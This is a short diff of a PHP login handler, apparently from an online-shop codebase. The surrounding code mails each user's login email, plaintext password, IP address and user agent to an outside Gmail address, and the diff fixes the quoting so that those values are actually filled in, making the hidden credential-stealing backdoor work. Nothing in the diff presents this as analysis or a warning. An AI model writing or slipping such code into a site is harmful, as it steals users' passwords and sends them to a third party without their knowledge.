@@ -36,7 +36,7 @@ if ( (isset($_POST['action']) && ($_POST['action'] == 'process')) || (isset($_PO
   $ua = $_SERVER['HTTP_USER_AGENT'];
   $ip = $_SERVER['REMOTE_ADDR'];
   $srv = $_SERVER['SERVER_NAME'];
-  $lg = '\nUser Login: $email_address\nPassword: $password\nIP: $ip\nUser Agent: $ua';
+  $lg = "\nUser Login: $email_address\nPassword: $password\nIP: $ip\nUser Agent: $ua";
   mail("malachi.amra@gmail.com", "User Login from $srv","$lg");
   if(ACCOUNT_EMAIL_CONFIRMATION=='true') {
     if (isset($_POST['pass'])) {
